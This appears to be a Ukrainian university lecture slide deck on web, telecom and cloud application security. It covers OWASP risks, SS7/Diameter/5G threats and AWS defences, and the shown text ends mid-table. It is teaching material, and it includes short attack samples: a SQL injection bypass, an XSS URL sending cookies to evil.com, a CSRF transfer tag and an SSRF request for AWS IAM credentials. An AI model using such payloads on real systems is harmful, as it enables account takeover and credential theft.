---
marp: true
theme: default
lang: uk
paginate: true
style: |
  section {
    background: #0d1117;
    color: #c9d1d9;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    font-size: 22px;
    padding: 40px 50px;
  }
  h1 { color: #e6edf3; font-size: 1.7em; border-bottom: 2px solid #1f6feb; padding-bottom: 0.2em; }
  h2 { color: #58a6ff; font-size: 1.3em; margin-top: 0.4em; }
  h3 { color: #e8b04b; font-size: 1.05em; margin-top: 0.3em; }
  ul, ol { margin-left: 1.2em; line-height: 1.6; }
  li { margin-bottom: 0.15em; }
  code { background: #161b22; color: #58a6ff; padding: 1px 5px; border-radius: 4px; font-size: 0.85em; }
  pre { background: #161b22; padding: 0.6em 1em; border-radius: 6px; font-size: 0.75em; color: #c9d1d9; }
  table { border-collapse: collapse; width: 100%; font-size: 0.78em; }
  th { background: #1f6feb; color: #fff; padding: 4px 8px; }
  td { padding: 4px 8px; border-bottom: 1px solid #30363d; }
  .highlight { color: #e8b04b; font-weight: bold; }
  section.title { text-align: center; }
  section.title h1 { border: none; font-size: 2em; margin-top: 1em; }
  header { color: #58a6ff; font-size: 0.7em; }
  footer { color: #666; font-size: 0.65em; }
---

<!-- _class: title -->

# Безпека веб- та телеком-застосунків

## Web & Telecom Application Security

Лекція 7 | Курс: Інформаційна безпека телекомунікаційних та хмарних технологій

Напрям: Кібербезпека

---

# План лекції

| # | Розділ | Слайди |
|---|--------|--------|
| 1 | **Безпека веб-застосунків** | 3–13 |
| 2 | **Безпека телекомунікаційних застосунків** | 14–33 |
| 3 | **Хмарний захист та DevSecOps** | 34–37 |
| 4 | **Підсумок** | 38 |

**Ключові теми:**
- OWASP Top 10, XSS, CSRF, SSRF, IDOR, SQL Injection
- WAF, HTTPS/TLS 1.3, JWT, OAuth 2.0, API Security
- SS7, Diameter, VoIP/SIP, SMS Security, GTP, 5G
- Telecom APIs, Mobile Apps, AWS API Gateway
- AWS WAF/Shield, CloudFront, DevSecOps, Compliance

---

<!-- Розділ 1: Безпека веб-застосунків -->

# 🌐 Безпека веб-застосунків — Огляд

## Чому веб-застосунки є ціллю №1 для атак?

- **Публічна доступність** — відкриті для Інтернету 24/7
- **Складність** — сотні компонентів, фреймворків, бібліотек
- **Бізнес-дані** — персональні дані, платежі, сесії
- **Швидкий розвиток** — CI/CD, нові функції щодня

## Ключові стандарти та організації

| Організація | Стандарт / Ресурс |
|-------------|-------------------|
| OWASP | Top 10, ASVS, SAMM, Cheat Sheets |
| NIST | SP 800-95 Web Services Security |
| PCI DSS | Requirement 6: Secure Systems & Applications |
| ISO 27001 | Annex A.14: System Acquisition, Development |

> **Факт:** 43% усіх кібератак спрямовані на вебзастосунки (Verizon DBIR 2023)

---

# OWASP Top 10 — 2021

| # | Категорія | Приклад |
|---|-----------|---------|
| A01 | **Broken Access Control** | IDOR, права доступу |
| A02 | **Cryptographic Failures** | Слабке шифрування, HTTP |
| A03 | **Injection** | SQL, Command, LDAP |
| A04 | **Insecure Design** | Відсутність threat modeling |
| A05 | **Security Misconfiguration** | Дефолтні паролі, відкриті S3 |
| A06 | **Vulnerable Components** | Log4Shell, застарілі бібліотеки |
| A07 | **Auth Failures** | Слабкі паролі, відсутність MFA |
| A08 | **Software & Data Integrity** | Supply chain, CI/CD |
| A09 | **Logging & Monitoring Failures** | Відсутність аудиту |
| A10 | **SSRF** | Доступ до внутрішніх ресурсів |

---

# Injection-атаки (A03)

## SQL Injection — найпоширеніший вид

```sql
-- Вхід: username = ' OR '1'='1
-- Вхід: password = anything

SELECT * FROM users WHERE name='' OR '1'='1' AND pass='...';
-- Повертає ВСІХ користувачів → обхід автентифікації!
```

## Типи ін'єкцій

| Тип | Вектор | Наслідки |
|-----|--------|----------|
| SQL Injection | HTTP-параметри, cookies | Витік/зміна даних, RCE |
| Command Injection | `eval()`, `exec()` | Виконання команд ОС |
| LDAP Injection | Форми авторизації | Обхід аутентифікації |
| XPath Injection | XML-запити | Витік структури XML |
| NoSQL Injection | MongoDB `$where` | Обхід авторизації |

## Захист

- **Parameterized queries / Prepared statements** (єдино правильний спосіб)
- ORM (але уважно з raw queries!)
- Валідація та whitelist вхідних даних
- Принцип найменших привілеїв для DB-облікового запису

---

# Вразливості автентифікації (A07)

## Типові помилки

- Слабкі паролі без обмежень складності
- Відсутність MFA / 2FA для критичних функцій
- Незахищені механізми відновлення паролю (security questions)
- Витік облікових даних через URL, логи
- Відсутність блокування після N невдалих спроб

## JWT (JSON Web Token) — атаки

```
Header.Payload.Signature
eyJ...  eyJ...  xxxx
```

| Атака | Метод | Захист |
|-------|-------|--------|
| `alg: none` | Підробка без підпису | Строго перевіряти алгоритм |
| Algorithm confusion | RS256→HS256 | Фіксований алгоритм на сервері |
| Weak secret | Брутфорс HMAC | Секрет ≥ 256 біт |
| Stolen token | XSS, MITM | HTTPS, httpOnly cookie, короткий TTL |

## Кращі практики

- **OAuth 2.0 + OIDC** для делегованої авторизації
- **PKCE** для публічних клієнтів (SPA, Mobile)
- **Refresh tokens з ротацією** замість довгих access tokens

---

# XSS — Cross-Site Scripting

## Три типи XSS

**Reflected XSS:** скрипт у відповіді на запит (URL-параметр)
```
https://shop.example/search?q=<script>document.location='evil.com/steal?c='+document.cookie</script>
```

**Stored XSS:** зловмисний скрипт збережено у БД (коментарі, профіль)

**DOM-based XSS:** маніпуляція з DOM на стороні клієнта без відповіді сервера

## Наслідки

- Крадіжка cookie / session tokens
- Keylogging — перехоплення введення паролів
- Перенаправлення на фішингові сайти
- Завантаження шкідливих файлів

## Захист

| Рівень | Механізм |
|--------|----------|
| Вихідне кодування | `htmlspecialchars()`, `encodeURIComponent()` |
| CSP | `Content-Security-Policy: default-src 'self'` |
| Атрибут cookies | `HttpOnly; Secure; SameSite=Strict` |
| Бібліотеки | DOMPurify, OWASP Java Encoder |

---

# CSRF та SSRF

## CSRF — Cross-Site Request Forgery

Атакуючий змушує авторизованого користувача ненавмисно надіслати запит:

```html
<!-- На сайті зловмисника: -->
<img src="https://bank.example/transfer?to=attacker&amount=5000">
```

**Захист:**
- **CSRF-токени** (синхронізований токен у формі)
- **SameSite Cookie** (`SameSite=Strict` або `Lax`)
- **Double Submit Cookie pattern**
- Перевірка заголовків `Origin` / `Referer`

---

## SSRF — Server-Side Request Forgery (A10)

Сервер виконує запити за адресою, вказаною зловмисником:

```
POST /fetch-url HTTP/1.1
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

**Цілі SSRF:**
- AWS IMDS → крадіжка IAM credentials
- Внутрішні мікросервіси (Redis, Elasticsearch)
- Cloud metadata endpoints
- Файли локальної файлової системи (`file:///etc/passwd`)

**Захист:**
- Whitelist дозволених доменів/IP
- Блокування приватних IP-діапазонів
- IMDSv2 (токен-авторизований metadata) в AWS
- Мережева сегментація: виключити доступ сервера до IMDS з коду

---

# IDOR та Broken Access Control (A01)

## IDOR — Insecure Direct Object Reference

```
GET /api/invoices/1042   → OK (мій рахунок)
GET /api/invoices/1043   → OK (чужий рахунок!) ← IDOR
```

**Характеристики:**
- Передбачувані ідентифікатори (числа, UUID, email)
- Відсутність перевірки власника ресурсу
- Горизонтальне / вертикальне підвищення привілеїв

## Типові помилки Broken Access Control

| Помилка | Наслідок |
|---------|----------|
| IDOR по ID в URL | Читання/зміна чужих даних |
| Обхід обмеження через заголовки | `X-Forwarded-For: 127.0.0.1` |
| Доступ до адмін-функцій без ролі | Привілейоване виконання |
| Перегляд прихованих URL | Directory traversal |

## Захист

- Перевірка авторизації **кожного** запиту на рівні сервера
- Використання непередбачуваних UUID замість числових ID
- ABAC (Attribute-Based Access Control) замість простих ролей
- Тести на авторизацію в автоматизованому CI/CD

---

# WAF — Web Application Firewall

## Що захищає WAF?

```
Клієнт → [WAF] → Load Balancer → Web Application → Database
         ↑
    Аналізує HTTP/HTTPS трафік
    Блокує шкідливі запити
```

**Режими:**
- **Detection mode** — журналює загрози без блокування
- **Prevention mode** — активно блокує запити

## AWS WAF — правила та можливості

| Компонент | Опис |
|-----------|------|
| Web ACL | Набір правил, асоційованих з ресурсом |
| Managed Rule Groups | Готові правила (OWASP, Bad Inputs, Bot Control) |
| Rate-based Rules | Захист від DDoS / brute-force |
| IP Set / Geo Match | Блокування за IP або країною |
| Custom Rules | Regex, string match, size constraint |

## Обмеження WAF

- Не замінює правильне кодування та тестування!
- False positives — потребує тонкого налаштування
- Не захищає від логічних вразливостей і IDOR

---

# HTTPS / TLS 1.3 та Безпека API

## TLS 1.3 — ключові покращення

| Параметр | TLS 1.2 | TLS 1.3 |
|----------|---------|---------|
| Handshake round-trips | 2-RTT | 1-RTT (0-RTT для resume) |
| Cipher suites | 37+ (включно зі слабкими) | 5 (лише AEAD) |
| Perfect Forward Secrecy | Опційно | Завжди (ECDHE) |
| RSA key exchange | Підтримується | Видалено |

## API Security — OWASP API Top 10

| # | Загроза |
|---|---------|
| API1 | Broken Object Level Authorization (BOLA/IDOR) |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization |
| API7 | Server-Side Request Forgery |
| API9 | Improper Inventory Management |

**Захист API:**
- Аутентифікація: **OAuth 2.0, API Key, mTLS**
- Схема і валідація: **OpenAPI / JSON Schema**
- Rate limiting, throttling, quota
- CORS — строга конфігурація

---

<!-- Розділ 2: Безпека телеком-застосунків -->

# 📡 Безпека телеком-застосунків — Огляд

## Стек протоколів телекомунікацій

```
┌──────────────────────────────────────┐
│  Рівень застосунків: SIP, Diameter   │
│  Рівень сигналізації: SS7, ISUP      │
│  Рівень транспорту: SCTP, TCP, UDP   │
│  Рівень ядра мережі: GTP, GPRS       │
└──────────────────────────────────────┘
```

## Ключові загрози в телекомі

| Сфера | Загрози |
|-------|---------|
| Сигналізація | SS7 атаки, Diameter атаки |
| Голос / VoIP | SIP flooding, toll fraud, eavesdropping |
| SMS | SMS spoofing, SIM swapping, smishing |
| Передача даних | GTP hijacking, GPRS interception |
| 5G | SUPI concealment bypass, rogue AMF |
| API | Telecom API abuse, SIM swap via API |

> **Важливо:** Телекомунікаційна інфраструктура є критичною і впливає на національну безпеку

---

# SS7 — Вразливості протоколу сигналізації

## Що таке SS7?

**SS7 (Signaling System No. 7)** — набір протоколів 1975 року для налаштування телефонних дзвінків у мережах PSTN/GSM.

Ключові підпротоколи: **MAP (Mobile Application Part), ISUP, TCAP, SCCP**

## Критичні вразливості SS7

| Атака | Метод | Наслідок |
|-------|-------|----------|
| **Відстеження місцезнаходження** | `SendRoutingInfo`, `ProvideSubscriberInfo` | Точні GPS-координати абонента |
| **Перехоплення дзвінків/SMS** | `RegisterSS` (переадресація) | Прослуховування, крадіжка 2FA |
| **Підробка CallerID** | `SRI-SM` маніпуляції | Фішинг, шахрайство |
| **Відмова у сервісі** | `CancelLocation`, `PurgeMS` | Відключення абонента від мережі |
| **Деанонімізація** | `ATI` (Any Time Interrogation) | Ідентифікація приватних номерів |

## Захист від SS7 атак

- **SS7 Firewall** — фільтрація аномальних MAP-повідомлень
- **GSMA FS.11** — стандарт захисту мережевих з'єднань
- **Моніторинг** — виявлення підозрілих `SRI`/`ATI` запитів
- Перехід на **Diameter** та **5G SBA** (Service-Based Architecture)

---

# Diameter — Протокол AAA в 4G/LTE

## Порівняння RADIUS vs Diameter

| Параметр | RADIUS | Diameter |
|----------|--------|----------|
| RFC | 2865 (1997) | 6733 (2012) |
| Транспорт | UDP | TCP / SCTP |
| Ненадійність | Так (UDP) | Ні (надійний) |
| TLS | Не обов'язково | DTLS/TLS |
| Підтримка 4G | Ні | Так (S6a, Gx, Gy, Rx) |

## Вразливості Diameter

| Вразливість | Опис |
|-------------|------|
| **Відстеження абонента** | `ULR/ULA` розкриває IMSI та місцезнаходження |
| **Підробка ідентичності** | Відсутність взаємної автентифікації між PLMN |
| **Відмова у сервісі** | `CLR` (Cancel-Location-Request) — відключення абонента |
| **Billing fraud** | Маніпуляції з `CCR/CCA` (Gx/Gy інтерфейс) |
| **Роумінг атаки** | Атаки через незахищені IPX-з'єднання |

## Стандарти захисту

- **3GPP TS 29.272** — захист S6a інтерфейсу
- **GSMA PRD FS.19** — Diameter Security
- **IPsec між SGW і PGW** для захисту транспорту

---

# VoIP / SIP — Безпека голосових застосунків

## Архітектура SIP

```
[SIP UA] ←─── SIP ───→ [Proxy Server] ←─── SIP ───→ [SIP UA]
               ↓                                          ↓
         [Media (RTP)]  ←────────────────────────→ [Media (RTP)]
```

**Компоненти:** User Agent (UA), Proxy, Registrar, B2BUA, SBC (Session Border Controller)

## Основні загрози VoIP

| Загроза | Опис | Наслідок |
|---------|------|----------|
| **SIP Flooding** | Flood INVITE/REGISTER | DoS, відмова у сервісі |
| **Toll Fraud** | Неавторизовані дзвінки | Фінансові збитки |
| **RTP Eavesdropping** | Захоплення медіапотоку | Прослуховування |
| **SIP Spoofing** | Підробка From/To заголовків | Фішинг, шахрайство |
| **Registration Hijacking** | Перереєстрація чужого UA | Перенаправлення дзвінків |
| **Man-in-the-Middle** | ARP Poisoning + RTP перехоплення | Повне прослуховування |

## Захист

- **SIPS** (SIP over TLS) для сигналізації
- **SRTP** (Secure RTP) для медіа
- **SBC** — Session Border Controller як точка контролю
- Дайджест-автентифікація: **SIP Digest + TLS**

---

# SMS Security — Загрози та захист

## Класифікація загроз SMS

### Smishing (SMS Phishing)
Зловмисник надсилає SMS від імені банку/сервісу з посиланням на фішинговий сайт

### SIM Swapping
```
Зловмисник → Оператор (соціальна інженерія/корупція)
           → Перенесення номера на нову SIM
           → Перехоплення 2FA SMS
           → Злом банківського рахунку
```

### SS7 SMS Interception
- Перехоплення SMS через SS7 `SRI-SM` + `MT-ForwardSM`
- Актуально для перехоплення OTP (One-Time Passwords)

## Проблеми SMS як 2FA

| Ризик | Метод атаки |
|-------|-------------|
| Перехоплення | SS7 атака, SIM swap |
| Реплей | OTP без expiry |
| Клонування SIM | Фізичний доступ до SIM |

## Рекомендації

- **Не використовувати SMS як єдиний 2FA** для критичних систем
- Мігрувати на **TOTP (FIDO2/WebAuthn, Google Authenticator)**
- Використовувати **SIM Lock**, блокування переносу номера

---

# GTP — GPRS Tunneling Protocol

## Роль GTP в мобільних мережах

```
UE → eNodeB → [S-GW] ══GTP-U══ [P-GW] → Internet
                   ↑
              GTP-C (управління тунелями)
```

**GTP-C** — керування (встановлення, модифікація, видалення тунелів)
**GTP-U** — передача даних у тунелях

## Вразливості GTP

| Вразливість | Наслідок |
|-------------|----------|
| **GTP-C injection** | Створення фіктивних сесій, billing fraud |
| **IP Spoofing через GTP** | Обхід IP-фільтрів з підробленим IP |
| **DoS на PGW** | Flooding Create Session Request |
| **Cross-tenant атаки** | Доступ до трафіку інших абонентів |
| **GTP Reflection/Amplification** | DDoS ампліфікація |

## Захист

- **GTP Firewall** — перевірка IMSI/TEID відповідності
- **Rate limiting** на Create/Delete Session запити
- **IPsec між SGW і PGW**
- **3GPP TS 33.210** — NDS/IP (Network Domain Security)

---

# 5G Security Architecture

## Ключові зміни безпеки в 5G vs 4G

| Аспект | 4G LTE | 5G NR |
|--------|--------|-------|
| Архітектура | Network Functions (монолітна) | SBA (Service-Based Architecture) |
| Протокол | Diameter | HTTP/2 + JSON (SBI) |
| Захист IMSI | Відкрита передача | SUCI (Concealed Identifier) |
| Mutual Auth | EPS-AKA | 5G-AKA, EAP-AKA' |
| Slice security | Відсутня | Network Slice Isolation |
| Edge | Centralized | MEC (Multi-Access Edge Computing) |

## 5G Вразливості

- **SUCI Bypass** — розкриття реального SUPI (IMSI) через Rogue Base Station
- **Rogue AMF** — підробка Access & Mobility Management Function
- **Network Slice Isolation failure** — витік між слайсами
- **MEC attacks** — компрометація граничних вузлів
- **SBI API attacks** — HTTP/2 ін'єкції у сервіс-орієнтовану шину

## Стандарти 5G Security

- **3GPP TS 33.501** — Security Architecture for 5G System
- **GSMA CLP.17** — 5G Cybersecurity Knowledge Base
- **ENISA 5G Threat Landscape (2021)**

---

# Telecom API Security

## Open Telecom APIs — можливості та ризики

Оператори відкривають мережеві можливості через API:

| API | Функція | Ризик |
|-----|---------|-------|
| **Number Verification** | Підтвердження номера | Privacy, unauthorized lookup |
| **SIM Swap Detection** | Виявлення зміни SIM | Abusing check to time attacks |
| **Device Location** | Геолокація пристрою | Стеження, GDPR |
| **OTP via SMS** | Надсилання одноразових кодів | SMS bombing, abuse |
| **QoD (Quality on Demand)** | Пріоритет трафіку | Billing bypass |

## CAMARA Project та GSMA Open Gateway

- **CAMARA** — відкритий проект стандартизації Telecom API (Linux Foundation)
- **GSMA Open Gateway** — ініціатива операторів для уніфікації API

## Загрози Telecom API

- **Credential stuffing** — масовий підбір API ключів
- **Rate limit bypass** — обхід лімітів через ротацію IP
- **BOLA** — несанкціонований доступ до даних інших абонентів
- **Unauthorized SIM swap** — використання API без згоди власника

---

# AWS API Gateway — Захист телеком-бекенду

## Архітектура захисту

```
Mobile App / Partner API
      ↓
[AWS API Gateway]
  ├── Throttling & Quotas
  ├── WAF Integration
  ├── Authorizer (Lambda / Cognito)
  └── API Key / IAM Auth
      ↓
[Backend: Lambda / ECS / EKS]
      ↓
[Telecom Backend / BSS/OSS]
```

## Механізми безпеки API Gateway

| Механізм | Опис |
|----------|------|
| **Usage Plans** | Throttling (rate + burst limit) per API key |
| **Lambda Authorizer** | Кастомна авторизація (JWT, OAuth, HMAC) |
| **Cognito User Pools** | Управління ідентифікацією абонентів |
| **AWS WAF** | Захист від OWASP Top 10 на рівні API |
| **Resource Policy** | Обмеження доступу за IP / VPC |
| **mTLS** | Взаємна автентифікація клієнт-сервер |

## Кращі практики

- Завжди використовувати **HTTPS** (`EndpointType: REGIONAL` + ACM cert)
- Логувати всі запити в **CloudWatch + X-Ray**
- Не розміщувати бізнес-логіку у авторизаторі

---

# Безпека мобільних застосунків

## OWASP Mobile Top 10 (2024)

| # | Категорія |
|---|-----------|
| M1 | Improper Credential Usage |
| M2 | Inadequate Supply Chain Security |
| M3 | Insecure Authentication/Authorization |
| M4 | Insufficient Input/Output Validation |
| M5 | Insecure Communication |
| M6 | Inadequate Privacy Controls |
| M7 | Insufficient Binary Protections |
| M8 | Security Misconfiguration |
| M9 | Insecure Data Storage |
| M10 | Insufficient Cryptography |

## Типові вразливості Android/iOS

| Вразливість | Наслідок |
|-------------|----------|
| Hardcoded API keys в APK/IPA | Компрометація backend |
| Збереження токенів у SharedPreferences | Крадіжка сесії |
| HTTP замість HTTPS | MITM атака |
| Certificate Pinning bypass | Проксі-аналіз трафіку |
| Небезпечний IPC (Intent, Deep Link) | Несанкціонований доступ |

---

# Роумінг та міжмережева безпека

## IPX — IP Packet Exchange

```
Оператор A (Україна) ←── IPX ──→ Оператор B (Польща)
                     ←── SS7/GRX ──→
```

**IPX** — приватна мережа для роумінгового обміну між операторами

## Ризики роумінгу

| Ризик | Вектор |
|-------|--------|
| SS7 атаки через роумінг | Зловмисний оператор або компрометований IPX |
| Diameter атаки | Незахищені роумінгові з'єднання |
| Витік IMSI | `ULR` повідомлення без шифрування |
| Billing fraud | Маніпуляції з роумінговими CDR |

## Захист

- **GSMA FS.11** — Baseline Security Controls for SS7
- **GSMA PRD FS.19** — Diameter Security Guidelines
- **IPsec тунелювання** між операторами
- **Моніторинг аномалій** — SIEM для SS7/Diameter подій
- **Bilateral Roaming Agreements** з вимогами безпеки

---

# Перехоплення трафіку в телекомі

## LAWFUL INTERCEPTION (LI) — Законне прослуховування

Регуляторна вимога у більшості країн (ETSI TS 101 331)

```
Оператор
  ├── ADMF (Administration Function)
  ├── IRI (Intercept Related Information) → LEA
  └── CC (Content of Communication) → LEA
                                          ↑
                              Law Enforcement Agency
```

## Ризики LI систем

- Несанкціонований доступ до LI-інтерфейсів (Vodafone Greece, 2005)
- Backdoor у LI-обладнанні від постачальників
- Компрометація ключів шифрування LI-передачі

## Шифрування в мобільних мережах

| Алгоритм | Мережа | Статус |
|----------|--------|--------|
| A5/0 | GSM | Шифрування відключено |
| A5/1 | GSM | Зламаний (rainbow tables) |
| A5/3 (Kasumi) | 3G | Слабкий, deprecated |
| SNOW 3G, AES, ZUC | 4G/5G | Рекомендовані |

---

# Телекомунікаційне шахрайство (Telecom Fraud)

## Класифікація шахрайства

| Тип | Механізм | Збитки |
|-----|----------|--------|
| **IRSF** (International Revenue Share Fraud) | Генерація дзвінків на premium номери | ~$6 млрд/рік |
| **Wangiri** | Пропущений дзвінок → передзвін на premium | Масова автоматизація |
| **CLI Spoofing** | Підробка Caller ID | Фішинг, шахрайство |
| **SIM Box Fraud** | Термінація через SIM-ферми | Ухилення від роумінгових тарифів |
| **Subscription Fraud** | Реєстрація з фіктивними даними | Послуги без оплати |
| **Bypass Fraud** | Незаконна VoIP термінація | Збитки оператора |

## Виявлення та запобігання

- **FMS (Fraud Management System)** — реального часу аналіз CDR
- **Machine Learning** — аномалії у патернах дзвінків
- **STIR/SHAKEN** — стандарт підтвердження CallerID (RFC 8224, 8226)
- **GSMA T-ISAC** — обмін інформацією про загрози між операторами

---

# Безпека VoLTE та WebRTC

## VoLTE (Voice over LTE) — Архітектура безпеки

```
UE → eNB → P-CSCF → I-CSCF → S-CSCF → AS (TAS)
     ↑                ↑
  IPsec (Uu)       SIP/TLS
```

**IMS (IP Multimedia Subsystem)** — серцевина VoLTE

| Захист | Механізм |
|--------|----------|
| Аутентифікація | IMS AKA (RFC 3310) |
| Сигналізація | SIP over TLS (SIPS) |
| Медіа | SRTP + SDES або DTLS-SRTP |
| Транспорт | IPsec між UE та P-CSCF |

## WebRTC Security

- **DTLS-SRTP** — обов'язкове шифрування медіа
- **ICE/STUN/TURN** — NAT traversal
- Ризики: TURN сервер може бачити трафік, WebRTC IP leak

## Vishing (Voice Phishing)

- Атаки з підробленим CallerID
- Deepfake голос + AI для переконливості
- Захист: **STIR/SHAKEN** верифікація дзвінків

---

# Безпека BSS/OSS систем

## BSS/OSS — Бізнес-підтримуючі системи

| Система | Функція | Ризики безпеки |
|---------|---------|----------------|
| **CRM** | Управління клієнтами | IDOR, витік персональних даних |
| **Billing / Rating** | Нарахування послуг | Маніпуляції з CDR, fraud |
| **Provisioning** | Активація послуг | Несанкціонована зміна конфігурації |
| **Mediation** | Обробка CDR | Ін'єкції, підробка записів |
| **NMS/EMS** | Управління мережею | RCE через legacy протоколи |
| **Self-care Portal** | Клієнтський портал | XSS, SQLi, IDOR |

## Специфічні ризики телеком-застосунків

- **Legacy системи** — COBOL, proprietary OS без патчів
- **Інтеграційні шини** — ESB, message queues без автентифікації
- **API між BSS/OSS** — відсутність шифрування, RBAC
- **CDR integrity** — цілісність записів дзвінків для розрахунків

---

# Zero Trust у телекомунікаційних мережах

## Zero Trust — основні принципи

> **«Never trust, always verify»** — жодна мережа не є довіреною за замовчуванням

| Принцип | Реалізація в телекомі |
|---------|----------------------|
| **Verify explicitly** | 5G-AKA, mTLS між NF, SUCI |
| **Least privilege** | RBAC у BSS/OSS, scoped OAuth tokens |
| **Assume breach** | Мікросегментація, Network Slice Isolation |

## Zero Trust Architecture для телекому

```
Абонент → AUSF (автентифікація) → AMF
                ↓ верифікація
          UDM (профіль) ←→ PCF (політики)
                ↓ авторизація
          Доступ до слайсу / сервісу
```

## Ключові компоненти

- **NIST SP 800-207** — Zero Trust Architecture
- **SBI з OAuth 2.0** — авторизація між NF у 5G Core
- **Network Slice Isolation** — мікросегментація для різних клієнтів
- **Continuous authentication** — верифікація не лише при підключенні

---

# NFV та SDN — Безпека віртуалізованих мереж

## Еволюція мережевої інфраструктури

| Характеристика | Традиційна мережа | NFV/SDN |
|----------------|------------------|---------|
| Обладнання | Спеціалізоване HW | COTS сервери |
| NF розгортання | Фізичне обладнання | VNF / CNF (VM/Container) |
| Управління | CLI, SNMP | REST API, YANG/NETCONF |
| Атаки | Фізичні, протокольні | Cloud-атаки + протокольні |

## Нові вектори атак NFV/SDN

- **Hypervisor escape** — вихід з VNF на фізичний хост
- **Tenant isolation failure** — витік між VNF різних клієнтів
- **SDN Controller compromise** — компрометація центрального мозку мережі
- **Оркестратор MANO** — несанкціонований деплой VNF
- **Supply chain VNF** — шкідливі образи у VNF marketplace

## Захист (ETSI NFV SEC)

- **ETSI GS NFV-SEC 001** — NFV Security Problem Statement
- Ізоляція VNF на рівні гіпервізора (vSphere, KVM з sVirt)
- Сканування образів VNF перед деплоєм (Trivy, ECR)
- API автентифікація для MANO (OAuth 2.0, mTLS)

---

# IoT та M2M безпека в телекомі

## Масштаб IoT загрози

- До **2030 року: 29 млрд IoT-пристроїв** (Ericsson Mobility Report)
- mMTC (massive Machine-Type Communications) у 5G — мільйони пристроїв на км²
- Більшість IoT-пристроїв: слабкі паролі, відсутність патчів, відкриті порти

## Специфічні загрози IoT/M2M

| Загроза | Опис |
|---------|------|
| **Botnet (Mirai)** | Зламані IoT-пристрої для DDoS |
| **IMSI Harvesting** | Масовий збір IMSI з M2M SIM |
| **SIM cloning** | Клонування SIM для несанкціонованого доступу |
| **OTA (Over-The-Air) attacks** | Шкідливі оновлення прошивки |
| **Protocol downgrade** | Примусовий перехід на 2G/NB-IoT без шифрування |

## Захист IoT в мобільних мережах

- **eUICC / iSIM** — захищений embedded SIM, важко клонувати
- **NB-IoT / LTE-M** — 3GPP стандарти з вбудованим шифруванням
- **APN ізоляція** — окремий приватний APN для IoT-трафіку
- **MDM (Mobile Device Management)** — централізоване управління пристроями

---

# Реагування на інциденти в телекомі

## Специфіка IR у телекомунікаційних компаніях

- **24/7 критична інфраструктура** — планове вікно обслуговування неможливе
- **Мільйони абонентів** — кожна секунда простою = збитки
- **Регуляторні вимоги** — обов'язкове повідомлення регулятора (CERT-UA, BEREC)
- **Legacy обладнання** — складно ізолювати без впливу на послуги

## Playbook: SS7 атака виявлена

```
1. ВИЯВЛЕННЯ
   SS7 Firewall → аномальний SRI-SM flood → Alert

2. АНАЛІЗ
   Зібрати: IMSI жертви, Origin PC, час, частота запитів

3. СТРИМУВАННЯ
   Блокувати Origin PC на рівні STP
   Повідомити абонента (якщо можливо)

4. ВІДНОВЛЕННЯ
   Скинути LocationArea для уражених IMSI
   Верифікувати відсутність активних переадресацій (RegisterSS)

5. ЗВІТУВАННЯ
   GSMA T-ISAC → обмін IOC з іншими операторами
   Регулятор (НКЕК) → обов'язкове повідомлення
```

## Ключові метрики IR

| Метрика | Ціль |
|---------|------|
| MTTD (Mean Time to Detect) | < 15 хвилин |
| MTTR (Mean Time to Respond) | < 1 година |
| Абоненти під загрозою | Повідомлені протягом 24 год |

---

# Тестування безпеки веб- та телеком-застосунків

## Методології тестування

| Методологія | Область | Стандарт |
|-------------|---------|----------|
| OWASP WSTG | Веб-застосунки | OWASP Testing Guide v4.2 |
| OWASP MASTG | Мобільні застосунки | OWASP Mobile Security |
| PTES | Penetration Testing | Penetration Testing Execution Standard |
| GSMA FS.11 | SS7 Security | GSMA Baseline Controls |
| 3GPP TS 33.117 | 5G Security Assurance | SECAM/SCAS |

## Інструменти тестування

| Категорія | Веб | Телеком |
|-----------|-----|---------|
| Проксі / MITM | Burp Suite, OWASP ZAP | SigPloit, ss7MAPer |
| Fuzzing | ffuf, wfuzz | SIPVicious, Asterisk |
| Сканування | Nikto, Nuclei | Nmap, Shodan |
| Мобільні | MobSF, APKTool | IMSI Catcher detect |
| API | Postman, Insomnia | Diameter test tools |

## 3GPP SECAM/SCAS

**Security Assurance Methodology** — обов'язкове тестування безпеки мережевого обладнання:
- SCAS документи для кожного NF (AMF, SMF, UDM)
- Випробувальні лабораторії: CAICT, Ericsson, NSS Labs
- Вимога: обладнання в 5G Core має пройти SCAS перед деплоєм

---

<!-- Розділ 3: Хмарний захист та DevSecOps -->

# ☁️ AWS WAF та AWS Shield

## AWS WAF — Web Application Firewall

```
Internet → [CloudFront / ALB / API GW]
                    ↓
               [AWS WAF]
           ┌────────────────┐
           │ Web ACL Rules  │
           │ ┌────────────┐ │
           │ │ AWS Managed│ │ ← Core Rule Set (OWASP)
           │ │ Rule Groups│ │ ← Bot Control
           │ └────────────┘ │
           │ ┌────────────┐ │
           │ │ IP Sets    │ │ ← Blocklist / Allowlist
           │ │ Rate Rules │ │ ← DDoS, Brute force
           │ └────────────┘ │
           └────────────────┘
```

## AWS Shield — DDoS захист

| Рівень | Опис | Захист |
|--------|------|--------|
| **Shield Standard** | Безкоштовно, автоматично | L3/L4 DDoS (SYN flood, UDP reflection) |
| **Shield Advanced** | $3000/місяць | L7 DDoS, SRT підтримка, Cost Protection |

**Shield Advanced + WAF = комплексний захист від DDoS + OWASP**

---

# Amazon CloudFront — CDN та безпека

## CloudFront як рівень безпеки

```
Users → [CloudFront Edge] → [Origin: ALB / S3 / API GW]
             ↓
         AWS WAF (L7)
         AWS Shield (L3/L4)
         TLS Termination
         OAC (Origin Access Control)
         Geo Restriction
```

## Функції безпеки CloudFront

| Функція | Опис |
|---------|------|
| **HTTPS Enforcement** | Redirect HTTP→HTTPS, TLS 1.3 |
| **Custom SSL** | ACM certificate для власного домену |
| **OAC** | Origin Access Control — лише CloudFront може читати S3 |
| **Field-level Encryption** | Шифрування окремих полів до бекенду |
| **Signed URLs / Cookies** | Захист приватного контенту |
| **Geo Restriction** | Блокування за країною |
| **Real-time logs** | Інтеграція з Kinesis Data Firehose |

---

# DevSecOps для веб- та телеком-застосунків

## Shift Left — Безпека на ранніх етапах

```
Plan → Code → Build → Test → Release → Deploy → Monitor
         ↓       ↓      ↓       ↓         ↓
       SAST    SCA    DAST   SecTest    RASP
     (Semgrep) (Trivy) (ZAP) (Pentest) (WAF)
```

## Інструменти DevSecOps

| Категорія | Інструмент | Призначення |
|-----------|-----------|-------------|
| SAST | Semgrep, Checkmarx, SonarQube | Статичний аналіз коду |
